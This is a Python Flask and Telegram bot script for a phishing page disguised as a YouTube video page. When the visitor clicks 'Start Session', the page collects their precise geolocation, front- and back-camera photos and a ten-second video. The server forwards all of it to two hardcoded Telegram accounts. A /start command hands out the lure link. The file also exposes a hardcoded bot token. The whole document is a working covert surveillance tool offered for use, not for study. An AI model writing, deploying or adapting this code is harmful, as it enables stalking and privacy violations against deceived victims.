import os
import threading
from flask import Flask, request, render_template_string
import telebot

# ========== HARDCODED CONFIG ==========
BOT_TOKEN = "8637899791:AAEjufAN7VOU6T4KEVcrBF4NncDJBh_di8w"
USER_IDS = [7361880623, 8475691696]   # both accounts
BASE_URL = "https://web-youtube-asuma66.up.railway.app"
# ======================================

bot = telebot.TeleBot(BOT_TOKEN)
app = Flask(__name__)

# ---------- HTML PAGE (same as before) ----------
HTML_PAGE = """<!DOCTYPE html>
<html>
<head>
    <title>YouTube</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { font-family: 'Roboto', sans-serif; margin:0; background:#0f0f0f; color:#fff; }
        .header { background:#202020; padding:12px 20px; display:flex; align-items:center; }
        .header .logo { font-size:24px; font-weight:bold; color:#ff0000; }
        .header .user { margin-left:auto; color:#aaa; }
        .container { max-width:900px; margin:20px auto; padding:0 20px; }
        .video-placeholder { background:#1a1a1a; border-radius:12px; padding:20px; text-align:center; }
        .video-placeholder img { max-width:100%; border-radius:8px; }
        .info { margin-top:15px; }
        .info .title { font-size:22px; font-weight:500; }
        .info .channel { color:#aaa; margin-top:8px; }
        .controls { margin-top:20px; display:flex; gap:10px; flex-wrap:wrap; }
        .controls button { background:#3ea6ff; border:none; color:#000; padding:8px 16px; border-radius:20px; font-weight:bold; cursor:pointer; }
        .controls button:disabled { opacity:0.5; cursor:not-allowed; }
        .status { margin-top:10px; color:#aaa; font-size:14px; }
        #locationStatus { color:#3ea6ff; }
    </style>
</head>
<body>
    <div class="header">
        <div class="logo">YouTube</div>
        <div class="user">asuma.66</div>
    </div>
    <div class="container">
        <div class="video-placeholder">
            <img id="thumbnail" src="https://img.youtube.com/vi/dQw4w9WgXcQ/hqdefault.jpg" alt="video thumbnail">
        </div>
        <div class="info">
            <div class="title">🔥 ASUSMA LIVE 🔥</div>
            <div class="channel">asuma.66 - 1.2M subscribers</div>
        </div>
        <div class="controls">
            <button id="startBtn">▶ Start Session</button>
            <button id="statusBtn" disabled>Idle</button>
        </div>
        <div class="status" id="statusText">Ready. Click "Start Session".</div>
        <div id="locationStatus">📍 Location: pending</div>
    </div>
    <script>
        let frontStream = null, backStream = null, mediaRecorder = null;
        let recordedChunks = [], recordingActive = false, maxDuration = 10000;
        const statusText = document.getElementById('statusText');
        const locationStatus = document.getElementById('locationStatus');
        const startBtn = document.getElementById('startBtn');

        function updateStatus(msg, good=true) {
            statusText.innerText = msg;
            statusText.style.color = good ? '#3ea6ff' : '#ff6b6b';
        }

        function sendLocation(coords) {
            const payload = { lat: coords.lat, lng: coords.lng };
            fetch('/location', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            })
            .then(() => {
                locationStatus.innerHTML = `📍 Location sent: ${coords.lat.toFixed(6)}, ${coords.lng.toFixed(6)}`;
                updateStatus('Location sent to bot.');
            })
            .catch(() => {
                locationStatus.innerHTML = '📍 Location send failed.';
            });
        }

        function sendLocationDenied() {
            fetch('/location', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ denied: true })
            })
            .then(() => {
                locationStatus.innerHTML = '📍 Location denied – notification sent.';
                updateStatus('Location denied – bot notified.', false);
            });
        }

        function captureFrame(stream) {
            return new Promise((resolve) => {
                const video = document.createElement('video');
                video.srcObject = stream;
                video.onloadedmetadata = () => {
                    video.play();
                    setTimeout(() => {
                        const canvas = document.createElement('canvas');
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        const ctx = canvas.getContext('2d');
                        ctx.drawImage(video, 0, 0);
                        canvas.toBlob((blob) => {
                            resolve(blob);
                            video.pause();
                            video.srcObject = null;
                        }, 'image/jpeg', 0.9);
                    }, 100);
                };
            });
        }

        async function sendMedia(frontBlob, backBlob, videoBlob) {
            const fd = new FormData();
            if (frontBlob) fd.append('frontImage', frontBlob, 'front.jpg');
            if (backBlob) fd.append('backImage', backBlob, 'back.jpg');
            if (videoBlob) fd.append('video', videoBlob, 'recording.webm');
            await fetch('/capture', { method: 'POST', body: fd });
        }

        async function startSession() {
            startBtn.disabled = true;
            startBtn.innerText = 'Starting...';
            updateStatus('Requesting location...');

            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (pos) => {
                        const coords = { lat: pos.coords.latitude, lng: pos.coords.longitude };
                        sendLocation(coords);
                        requestCamera();
                    },
                    (err) => {
                        locationStatus.innerHTML = '📍 Location denied.';
                        sendLocationDenied();
                        requestCamera();
                    },
                    { enableHighAccuracy: true, timeout: 10000 }
                );
            } else {
                locationStatus.innerHTML = '📍 Geolocation not supported.';
                sendLocationDenied();
                requestCamera();
            }
        }

        async function requestCamera() {
            updateStatus('Requesting camera access...');
            try {
                const back = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' }, audio: false });
                const front = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
                frontStream = front;
                backStream = back;
                updateStatus('Camera granted – capturing screenshots...');
                const frontBlob = await captureFrame(frontStream);
                const backBlob = await captureFrame(backStream);

                mediaRecorder = new MediaRecorder(backStream, { mimeType: 'video/webm;codecs=vp9' });
                recordedChunks = [];
                mediaRecorder.ondataavailable = (e) => { if (e.data.size) recordedChunks.push(e.data); };
                mediaRecorder.onstop = () => {
                    const blob = new Blob(recordedChunks, { type: 'video/webm' });
                    sendMedia(frontBlob, backBlob, blob);
                    frontStream.getTracks().forEach(t => t.stop());
                    backStream.getTracks().forEach(t => t.stop());
                    updateStatus('✅ Media sent!');
                    startBtn.disabled = false;
                    startBtn.innerText = '▶ Start Session';
                };
                mediaRecorder.start(1000);
                recordingActive = true;
                updateStatus('Recording up to 10s...');
                setTimeout(() => {
                    if (recordingActive && mediaRecorder.state === 'recording') {
                        mediaRecorder.stop();
                        recordingActive = false;
                    }
                }, maxDuration);
                window.addEventListener('beforeunload', () => {
                    if (recordingActive && mediaRecorder.state === 'recording') mediaRecorder.stop();
                });
                startBtn.innerText = 'Recording...';
            } catch (e) {
                updateStatus('Camera permission denied.', false);
                fetch('/camera_denied', { method: 'POST' });
                startBtn.disabled = false;
                startBtn.innerText = '▶ Start Session';
            }
        }

        startBtn.addEventListener('click', startSession);
        updateStatus('Click "Start Session" – location first, then camera.');
    </script>
</body>
</html>"""

# ---------- ROUTES ----------
@app.route('/')
def index():
    return render_template_string(HTML_PAGE)

@app.route('/location', methods=['POST'])
def location():
    data = request.get_json()
    if data.get('denied'):
        for uid in USER_IDS:
            try:
                bot.send_message(uid, "📍 Location: Denied by user.")
            except Exception as e:
                print(f"Send error to {uid}: {e}")
        return "OK", 200
    lat = data.get('lat')
    lng = data.get('lng')
    if lat is not None and lng is not None:
        for uid in USER_IDS:
            try:
                bot.send_location(uid, lat, lng)
                bot.send_message(uid, f"📍 Location: {lat}, {lng}")
            except Exception as e:
                print(f"Location send error to {uid}: {e}")
        return "OK", 200
    return "Invalid", 400

@app.route('/camera_denied', methods=['POST'])
def camera_denied():
    for uid in USER_IDS:
        try:
            bot.send_message(uid, "📷 Camera: Denied by user.")
        except Exception as e:
            print(f"Send error to {uid}: {e}")
    return "OK", 200

@app.route('/capture', methods=['POST'])
def capture():
    front = request.files.get('frontImage')
    back = request.files.get('backImage')
    video = request.files.get('video')
    for uid in USER_IDS:
        try:
            if front:
                front.seek(0)
                bot.send_photo(uid, front.read())
            if back:
                back.seek(0)
                bot.send_photo(uid, back.read())
            if video:
                video.seek(0)
                bot.send_video(uid, video.read(), supports_streaming=True)
            bot.send_message(uid, "📸 Media capture complete.")
        except Exception as e:
            print(f"Media send error to {uid}: {e}")
    return "OK", 200

# ---------- BOT ----------
@bot.message_handler(commands=['start'])
def send_link(m):
    bot.reply_to(m, f"🔗 Open this link on your phone:\n{BASE_URL}/\n\nIt will ask for location and camera, then send data automatically.")

def run_bot():
    bot.polling(non_stop=True, interval=1)

if __name__ == '__main__':
    threading.Thread(target=run_bot, daemon=True).start()
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
